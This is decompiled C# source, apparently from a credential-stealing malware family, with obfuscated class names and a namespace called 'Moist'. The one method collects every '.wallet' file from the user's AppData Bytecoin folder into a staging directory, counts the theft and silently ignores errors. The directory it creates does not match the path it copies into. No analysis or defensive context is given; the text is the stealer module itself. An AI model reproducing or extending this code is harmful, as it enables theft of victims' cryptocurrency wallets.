using System;
using System.IO;
using Moist;

// Token: 0x0200005C RID: 92
internal class Class29
{
	// Token: 0x0600024B RID: 587 RVA: 0x00012B4C File Offset: 0x00010D4C
	public static void smethod_0(string string_0)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\bytecoin").GetFiles())
			{
				Directory.CreateDirectory(string_0 + "\\Wallets\\Bytecoin\\");
				if (fileInfo.Extension.Equals(".wallet"))
				{
					fileInfo.CopyTo(string_0 + "\\Bytecoin\\" + fileInfo.Name);
				}
			}
			Class29.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x0600024C RID: 588 RVA: 0x0000446C File Offset: 0x0000266C
	public Class29()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0400010A RID: 266
	public static int int_0;
}
